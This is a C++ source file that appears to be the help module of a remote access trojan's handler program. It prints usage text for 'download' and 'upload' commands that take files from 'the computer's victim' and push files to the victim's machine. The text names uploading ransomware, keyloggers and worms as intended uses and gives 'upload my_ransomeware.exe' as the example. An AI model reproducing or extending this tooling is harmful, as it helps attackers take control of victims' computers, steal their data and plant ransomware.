#include "man.h"



Man::Man(const std::string command)
{
	if (command == "upload")
	{
		Man::upload();
	}
	else if (command == "download")
	{
		Man::download();
	}
}
void Man::download()
{
	print_status("#\t\t\t Download\t\t\t#");
	print_status("Synthax : download <file_In_The_Computer's_Victim>");
	print_status("The handler(you) will download a specified file in the current directory of the victim");
	print_status("You can see all files and folders by taping : ls and then download one");
	print_status("You can change directory to target others files by taping cd <directory>");
	print_status("Very usefull for collecting data about the user or transfering files");
	print_done("Exemple : download image.jpg");
}
void Man::upload()
{
	print_status("#\t\t\t Upload\t\t\t#");
	print_status("Synthax : upload <your_file> ");
	print_status("The handler (you) will upload a file (located in the same folder as the handler)");
	print_status("toward the computer's victim");
	print_status("You can change directory to upload where you want by taping cd <directory>");
	print_status("Very usefull for uploading ransomeware, keylogger, worm etc ..");
	print_done("Exemple : upload my_ransomeware.exe");
}